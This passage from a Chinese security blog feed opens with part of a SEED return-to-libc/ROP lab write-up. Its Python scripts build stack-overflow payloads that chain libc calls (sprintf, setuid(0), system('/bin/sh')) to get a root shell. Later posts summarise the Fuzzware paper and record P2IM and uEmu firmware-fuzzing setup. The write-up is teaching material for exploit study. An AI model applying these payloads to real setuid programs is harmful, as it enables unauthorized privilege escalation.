p_addr</span><br><span class="line">arg3_addr = <span class="number">0x0</span></span><br><span class="line">content[<span class="number">504</span>: <span class="number">508</span>] = (arg1_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">508</span>: <span class="number">512</span>] = (arg2_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">512</span>: <span class="number">516</span>] = (arg3_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
</li>
<li><p>成功获取root权限shell</p>
<img src="/posts/53f1e8f/%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90.png" class="" title="获取权限"></li>
</ol>
<h3 id="Task-5-Optional-Return-Oriented-Programming"><a href="#Task-5-Optional-Return-Oriented-Programming" class="headerlink" title="Task 5 (Optional): Return-Oriented Programming"></a>Task 5 (Optional): Return-Oriented Programming</h3><ol>
<li><p>ROP攻击实验一（无参数串接函数）</p>
<p>无参数ROP传递链构造比较简单，因为正常情况下在正常执行函数后esp指针自动指向下一帧，所以只需将bar函数的地址按序填入返回地址10次即可。</p>
<p>构造脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">  <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line">bar_addr = <span class="number">0x565562d0</span>    <span class="comment"># The address of foo()</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>  <span class="comment"># The address of exit()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># foo*10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  content += (bar_addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit()</span></span><br><span class="line">content += (exit_addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<img src="/posts/53f1e8f/ROP_1_results.png" class="" title="ROP_1_results">
</li>
<li><p>ROP攻击实验二（存在参数）</p>
<p>思路：通过跳过前序操作来实现，每一次调用函数都会跳过其对ebp操作两个指令，从而ebp无法压栈，因此可以直接填入参数，函数执行完毕后ebp可以跳转到下一个函数位置（跳过前序操作），继续执行。</p>
<p>构造python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">  <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">baz_skip_addr = <span class="number">0x56556315</span> + <span class="number">7</span>    <span class="comment"># The address of baz(skip)</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>  <span class="comment"># The address of exit()</span></span><br><span class="line">ebp_foo = <span class="number">0xffffc968</span>  <span class="comment"># foo()&#x27;s frame pointer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line"></span><br><span class="line">ebp_next = ebp_foo</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  ebp_next += <span class="number">0x20</span></span><br><span class="line">  content += tobytes(ebp_next)</span><br><span class="line">  content += tobytes(baz_skip_addr)</span><br><span class="line">  content += tobytes(<span class="number">0xAABBCCDD</span>)</span><br><span class="line">  content += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>-<span class="number">3</span>*<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># exit()</span></span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>) <span class="comment"># The value is not important.</span></span><br><span class="line">content += tobytes(exit_addr)  <span class="comment"># Return address</span></span><br><span class="line">content += tobytes(<span class="number">0xEEBBCCDD</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果成功执行baz函数</p>
<img src="/posts/53f1e8f/ROP_2_results.png" class="" title="ROP_2_results">
</li>
<li><p>ROP攻击实验二（串接libc函数）</p>
<p>思路：通过跳过前序对ebp的操作来串接多个需要参数的libc函数。</p>
<p>构造脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">  <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_addr = <span class="number">0xf7e20de0</span>    <span class="comment"># The address of printf()</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>  <span class="comment"># The address of exit()</span></span><br><span class="line">leaveret = <span class="number">0x565562ce</span></span><br><span class="line">bash_addr = <span class="number">0xffffd3dc</span></span><br><span class="line">ebp_foo = <span class="number">0xffffc968</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line"></span><br><span class="line">ebp_next = ebp_foo + <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)  <span class="comment"># Next ebp value</span></span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>-<span class="number">2</span>*<span class="number">4</span>)  <span class="comment"># Fill up the frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># printf()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">  ebp_next += <span class="number">0x20</span></span><br><span class="line">  content += tobytes(ebp_next)</span><br><span class="line">  content += tobytes(printf_addr)</span><br><span class="line">  content += tobytes(leaveret)</span><br><span class="line">  content += tobytes(bash_addr)</span><br><span class="line">  content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>-<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># exit()</span></span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">content += tobytes(exit_addr)  <span class="comment"># Return address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果成功打印出MYSHELL环境变量值</p>
<img src="/posts/53f1e8f/ROP_3_results.png" class="" title="ROP_3_results">
</li>
<li><p>ROP攻击实验三（参数存在0）</p>
<p>可以通过调用sprintf函数传递setuid的参数0，然后使用setuid(0)时real user ID &#x3D; effective user ID &#x3D; 0，从而使得bash&#x2F;dash在判断real user ID和effecive user ID时发现两者一致，从而使保护失效。然后调用system(‘&#x2F;bin&#x2F;sh’)获取root权限的shell，最终调用exit函数防止程序无法正常退出。</p>
<p>构造python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">  <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_addr = <span class="number">0xf7e20de0</span>    <span class="comment"># The address of printf()</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>  <span class="comment"># The address of exit()</span></span><br><span class="line">leaveret = <span class="number">0x565562ce</span></span><br><span class="line">bash_addr = <span class="number">0xffffd3de</span></span><br><span class="line">ebp_foo = <span class="number">0xffffc968</span></span><br><span class="line">sprintf_addr = <span class="number">0xf7e20e40</span></span><br><span class="line">setuid_addr = <span class="number">0xf7e99e30</span></span><br><span class="line">system_addr = <span class="number">0xf7e12420</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate the address of setuid()&#x27;s 1st argument</span></span><br><span class="line">sprintf_arg1 = ebp_foo + <span class="number">12</span> + <span class="number">5</span>*<span class="number">0x20</span></span><br><span class="line"><span class="comment"># The address of a byte that contains 0x00</span></span><br><span class="line">sprintf_arg2 = bash_addr + <span class="built_in">len</span>(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line"></span><br><span class="line">ebp_next = ebp_foo + <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)  <span class="comment"># Next ebp value</span></span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>-<span class="number">2</span>*<span class="number">4</span>)  <span class="comment"># Fill up the frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sprintf(sprintf_arg1, sprintf_arg2)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  ebp_next += <span class="number">0x20</span></span><br><span class="line">  content += tobytes(ebp_next)</span><br><span class="line">  content += tobytes(sprintf_addr)</span><br><span class="line">  content += tobytes(leaveret)</span><br><span class="line">  content += tobytes(sprintf_arg1)</span><br><span class="line">  content += tobytes(sprintf_arg2)</span><br><span class="line">  content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>-<span class="number">5</span>*<span class="number">4</span>)</span><br><span class="line">  sprintf_arg1 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setuid(0)</span></span><br><span class="line">ebp_next += <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)</span><br><span class="line">content += tobytes(setuid_addr)</span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>-<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># system(&quot;/bin/bash&quot;)</span></span><br><span class="line">ebp_next += <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)</span><br><span class="line">content += tobytes(system_addr)</span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += tobytes(bash_addr)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> *(<span class="number">0x20</span> - <span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit()</span></span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">content += tobytes(exit_addr)  <span class="comment"># Return address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果如下，成功获取到root权限下的shell</p>
<img src="/posts/53f1e8f/ROP_4_results.png" class="" title="ROP_4_results"></li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>Return</tag>
        <tag>to</tag>
        <tag>Libc</tag>
        <tag>SEED</tag>
        <tag>Lab</tag>
      </tags>
  </entry>
  <entry>
    <title>Fuzzware论文笔记</title>
    <url>/posts/fd2ce383.html</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>实现了模拟器Fuzzware，特点：减少了fuzz的input开销，节省了时间。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>针对当前几种对固件模拟fuzz的方法的局限性进行了分析</p>
<ul>
<li>high-level模拟：通过挂钩完全绕过MMIO的模拟。<strong>局限：过于high-level，无法发现外设驱动代码的漏洞。</strong></li>
<li>pattern-based MMIO模拟：通过根据固件对MMIO的访问模式来对MMIO进行分类，然后对分类好的MMIO执行特定的访问处理方式，从而可以减少fuzz的输入<strong>局限：（分类需要大量人力，P2IM），且存在寄存器误分类的问题</strong></li>
<li>基于符号化执行模拟：在pattern-base模拟上的改进。不需要人力对MMIO访问pattern进行分类，而是通过将固件的访问认作符号，每当需要访问特定MMIO具体值时，就求解约束获取最佳路径。<strong>局限：（存在路径消失问题，uEmu），代码覆盖率不够</strong></li>
</ul>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
<li><p>提出了一种细粒度的MMIO访问建模方法，将其与基于覆盖率引导的模糊测试结合</p>
<ul>
<li><p>能够识别比特级别的硬件行为（相较于P2IM的寄存器级别）</p>
</li>
<li><p>保留了固件的所有路径，没有路径消除（相较于uEmu的路径消除）</p>
</li>
<li><p>使用局部范围的动态符号执行分析硬件值的哪些部分实际有意义</p>
</li>
</ul>
</li>
<li><p>实现了Fuzzware，相较于uEmu，P2IM，代码覆盖率和通用性均有较大提升</p>
</li>
</ul>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><ul>
<li>没有对DMA实现自动化建模。</li>
<li>由于没有进行路径消除，导致会在一些位置陷入死循环或卡死的情况，可以通过针对卡死情况的路径消除进行改进。</li>
</ul>
<h2 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h2><p>通过DSE（动态符号化执行）将MMIO的输入进行建模，查看其输入是否是全部都要用到（32bit全部有用），或者输入只需为常数或有限值即可。并根据建模结果对其输入进行特定的修剪。</p>
<h2 id="性能比较"><a href="#性能比较" class="headerlink" title="性能比较"></a>性能比较</h2><p>当前对固件未知外设接口的模拟（主要是为了能够确定fuzz输入点并减少fuzz内容，以便提高性能）有三种方法：分别为high-level模拟，基于access-pattern的模拟，基于符号化执行的模拟。</p>
<ul>
<li>high-level模拟：通过挂钩完全绕过MMIO的模拟</li>
<li>pattern-based MMIO模拟：通过根据固件对MMIO的访问模式来对MMIO进行分类，然后对分类好的MMIO执行特定的访问处理方式，从而可以减少fuzz的输入（分类需要大量人力）</li>
<li>基于符号化执行模拟：在pattern-base模拟上的改进。不需要人力对MMIO访问pattern进行分类，而是通过将固件的访问认作符号，每当需要访问特定MMIO具体值时，就求解约束获取最佳路径。（存在路径消失问题）</li>
</ul>
<h2 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h2><ol>
<li><p>定义了两种输入开销：full input overhead（只有一个输入能让程序继续执行①）；Partial input overhead（③，32bit中只有8bit可以用到），figure 3中的case A，B，C，Default只需两个特定bit即可，mmio-&gt;status只需一个bit代表即可，而实际fuzzing input需要32bit代表输入，因此可以显著减少开销。1-2&#x2F;32(94%)和1-1&#x2F;32（97%）。</p>
<img src="/posts/fd2ce383/figure_2.png" class="" title="figure_2">

<img src="/posts/fd2ce383/figure_3.png" class="" title="figure_3">
</li>
<li><p>模型大致结构，fuzzing engine产生输入raw input，输入到MMIO，模型查看对应MMIO是否存在已建模的MMIO Access Model，如果是则将其根据分类模型将raw input转为实际输入，如果没有，则根据当前情况进行DSE对其进行分类建模。一轮输入停止后，获取反馈，优化输入。</p>
<img src="/posts/fd2ce383/figure_4.png" class="" title="figure_4">
</li>
<li><p>DSE过程：</p>
<ul>
<li><p>确定建模分析范围：跟踪MMIO的访问，如果内存或寄存器中存在其符号表达式则表明其存活，一直进行直到MMIO符号dead或函数返回或超时</p>
</li>
<li><p>模型分类定义</p>
<img src="/posts/fd2ce383/Table_1.png" class="" title="Table_1">

<img src="/posts/fd2ce383/model_definition_1.png" class="" title="model_definition_1">

<img src="/posts/fd2ce383/model_definition_2.png" class="" title="model_definition_2">
</li>
<li><p>实际建模：使用angr工具。</p>
<img src="/posts/fd2ce383/angr.png" class="" title="angr"></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>P2IM复现</title>
    <url>/posts/5786d6f8.html</url>
    <content><![CDATA[<p>导师说要多实践，因此将看过的P2IM论文进行复现，同时对源码进行简单查看。</p>
<p>看网上并没有相关的复现教程，因此写下该博客</p>
<p>链接: <a href="https://github.com/RiS3-Lab/p2im">https://github.com/RiS3-Lab/p2im</a></p>
<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p>Ubuntu 16.04 !!!（重中之重！其他版本可能不成功）</p>
<p>GNU Arm Embedded Toolchain：<a href="https://developer.arm.com/downloads/-/gnu-rm">https://developer.arm.com/downloads/-/gnu-rm</a></p>
<p>fuzz target: <a href="https://github.com/RiS3-Lab/p2im-real_firmware/tree/d4c7456574ce2c2ed038e6f14fea8e3142b3c1f7/binary">https://github.com/RiS3-Lab/p2im-real_firmware/tree/d4c7456574ce2c2ed038e6f14fea8e3142b3c1f7/binary</a></p>
<h2 id="2-过程"><a href="#2-过程" class="headerlink" title="2. 过程"></a>2. 过程</h2><ol>
<li><p>首先下载p2im源码</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/RiS3-Lab/p2im.git</span><br><span class="line"><span class="built_in">cd</span> p2im</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载子项目</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># submodules are cloned into externals/</span></span><br><span class="line">git submodule update --init</span><br><span class="line">git submodule update --remote</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载并解压GNU Arm Embedded Toolchain，并且将其内&#x2F;bin目录添加到环境变量</p>
</li>
<li><p>编译AFL，ubuntu16.04测试没有问题，ubuntu22.04不行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Compile AFL</span></span><br><span class="line">make -C afl/</span><br></pre></td></tr></table></figure>
</li>
<li><p>Qemu已经在项目里预编译好了，不需要额外配置</p>
</li>
</ol>
<h2 id="3-Fuzzing"><a href="#3-Fuzzing" class="headerlink" title="3. Fuzzing"></a>3. Fuzzing</h2><ol>
<li><p>确定工作区</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">WORKING_DIR=&lt;repo_path&gt;/fuzzing/&lt;firmware_name&gt;/&lt;fuzzing_run_num&gt;/</span><br><span class="line">mkdir -p $&#123;WORKING_DIR&#125;</span><br><span class="line">cd $&#123;WORKING_DIR&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>将输入seed文件复制到工作区&#x2F;inputs文件夹下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copy the <span class="string">&quot;random&quot;</span> seed to the working directory</span></span><br><span class="line">cp -r &lt;repo_path&gt;/fuzzing/templates/seeds/ $&#123;WORKING_DIR&#125;/inputs</span><br></pre></td></tr></table></figure>
</li>
<li><p>将配置文件fuzz.cfg.template文件复制到工作区下，注意：文件名和内容需要根据修改！要把文件内&lt;&gt;的内容改为实际绝对地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copy the template to the working directory</span></span><br><span class="line">cp &lt;repo_path&gt;/fuzzing/templates/fuzz.cfg.template fuzz.cfg</span><br></pre></td></tr></table></figure>
</li>
<li><p>开始fuzz</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;repo_path&gt;/model_instantiation/fuzz.py -c fuzz.cfg</span><br></pre></td></tr></table></figure>

<p>难绷，还是报错。。。不知道是哪儿的问题。。。</p>
<img src="/posts/5786d6f8/image-20231218185021864.png" class="" title="image-20231218185021864"></li>
</ol>
<p>又试了几次，其中把报错上面的命令又跑了跑，再运行发现就可以了。。。</p>
<img src="/posts/5786d6f8/image-20231218190107050.png" class="" title="image-20231218190107050">

<img src="/posts/5786d6f8/image-20231218190125898.png" class="" title="image-20231218190125898">]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
    <title>linux虚拟机设置github加速</title>
    <url>/posts/d1a2e76c.html</url>
    <content><![CDATA[<p>最近在使用vmware虚拟机跑项目复现，需要频繁使用github，因此在此记录下github加速的简单方法</p>
<p><a href="https://zhuanlan.zhihu.com/p/432414619">https://zhuanlan.zhihu.com/p/432414619</a></p>
]]></content>
      <tags>
        <tag>github</tag>
        <tag>vmware</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>uEmu复现</title>
    <url>/posts/8c8037e9.html</url>
    <content><![CDATA[<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p>Ubuntu 20.04（最好分配大于20G存储空间，否则可能不够用）</p>
<p>gitee链接：<a href="https://gitee.com/cpdt/uEmu.git">https://gitee.com/cpdt/uEmu.git</a></p>
<p>virtualbox</p>
<h2 id="2-步骤"><a href="#2-步骤" class="headerlink" title="2. 步骤"></a>2. 步骤</h2><ol>
<li><p>克隆下载uEmu</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/cpdt/uEmu.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用vagrant Installation方式复现（不推荐，感觉和直接源码安装没区别，还要多出安装虚拟机的步骤，虚拟机套虚拟机。。。还容易崩溃。。。），安装virtualbox</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install vagrant</span><br><span class="line">sudo apt install virtualbox</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动虚拟机</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vagrant up</span><br></pre></td></tr></table></figure>

<p>需要等几分钟，第一次会下载ubuntu镜像，这里放一个清华源镜像，添加到vagrantfile里：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config.vm.box_url = &#x27;https://mirrors.tuna.tsinghua.edu.cn/ubuntu-cloud-images/focal/20231207/focal-server-cloudimg-amd64-vagrant.box&#x27;</span><br></pre></td></tr></table></figure>

<p>再次vagrant up。没有报错，正常界面如下</p>
<img src="/posts/8c8037e9/image-20231219094453267.png" class="" title="image-20231219094453267">

<p>再输入命令登入即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vagrant ssh</span><br></pre></td></tr></table></figure>

<p>接下来进行源码编译安装，其中git-repo建议用清华源下载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export uEmuDIR=/home/user/uEmu </span><br><span class="line">sudo apt-get install git-repo   </span><br><span class="line">cd $uEmuDIR</span><br><span class="line">repo init -u https://github.com/MCUSec/manifest.git -b uEmu</span><br><span class="line">repo sync</span><br></pre></td></tr></table></figure>

<p>其中<code>  init -u https://github.com/MCUSec/manifest.git -b uEmu</code>语句可能会报错，需要将python改为python3.</p>
<img src="/posts/8c8037e9/image-20231219095415829-17029508568891.png" class="" title="image-20231219095415829">

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rm /usr/bin/python</span><br><span class="line">sudo ln -s /usr/bin/python3 /usr/bin/python </span><br></pre></td></tr></table></figure>

<p>接下来编译uEmu，官方给的创建文件夹命令是sudo，但是会导致make时权限不足，所以不需要加sudo，编译耗时大概在1小时左右。。。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> <span class="variable">$uEmuDIR</span>/build</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> <span class="variable">$uEmuDIR</span>/build</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make -f <span class="variable">$uEmuDIR</span>/Makefile &amp;&amp; make -f <span class="variable">$uEmuDIR</span>/Makefile install</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Go make some coffee or <span class="keyword">do</span> whatever you want, this will take some time (approx. 60 mins on a 4-core machine)</span></span><br></pre></td></tr></table></figure>

<p>在make阶段解压tar文件时会出现虚拟机崩溃的现象，尝试增大内存以及处理器数量，成功解决。（建议设置大一点，否则后面也有可能卡死），另外发现虚拟机内编译时用的包是ubuntu18.04版本的，所以想要直接源码安装的可以考虑使用ubuntu18.04虚拟机。</p>
<img src="/posts/8c8037e9/image-20231219101217730-17029523713913.png" class="" title="image-20231219101217730">

<p>中间报错</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import distro ModuleNotFoundError: No module named &#x27;distro&#x27;&quot;.  Stop.</span><br><span class="line">apt install python3-distro</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/vagrant/uEmu/build/opt/bin/clang: error while loading shared libraries: libtinfo.so.5: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装ncurses库</span></span><br><span class="line">sudo apt-get install libncurses5</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/vagrant/uEmu/build/llvm-10.0.0.src/tools/gold/gold-plugin.cpp:34:10: fatal error: &#x27;plugin-api.h&#x27; file not found</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install binutils-dev</span><br></pre></td></tr></table></figure>

<p>找不到libelf&#x2F;libelf.h</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装库</span></span><br><span class="line">sudo apt-get install libelf-dev</span><br></pre></td></tr></table></figure>



<p>找不到glib.h<br>找到报错文件目录下CMakeList.txt添加glib-2.0的目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">include_directories($</span><span class="language-bash">&#123;catkin_INCLUDE_DIRS&#125;</span></span><br><span class="line"> /usr/lib/aarch64-linux-gnu/glib-2.0/include</span><br><span class="line"> /usr/include/glib-2.0</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>configure文件Permission Denied</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改文件权限即可</span></span><br><span class="line">chmod +x ./configure</span><br></pre></td></tr></table></figure>

<p>&#x2F;usr&#x2F;include&#x2F;gtk-2.0&#x2F;gtk&#x2F;gtktypeutils.h:236:1: error: ‘GTypeDebugFlags’ is deprecated [-Werror&#x3D;deprecated-declarations]</p>
<p>应该是版本不对应，不知道怎么改，废了。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
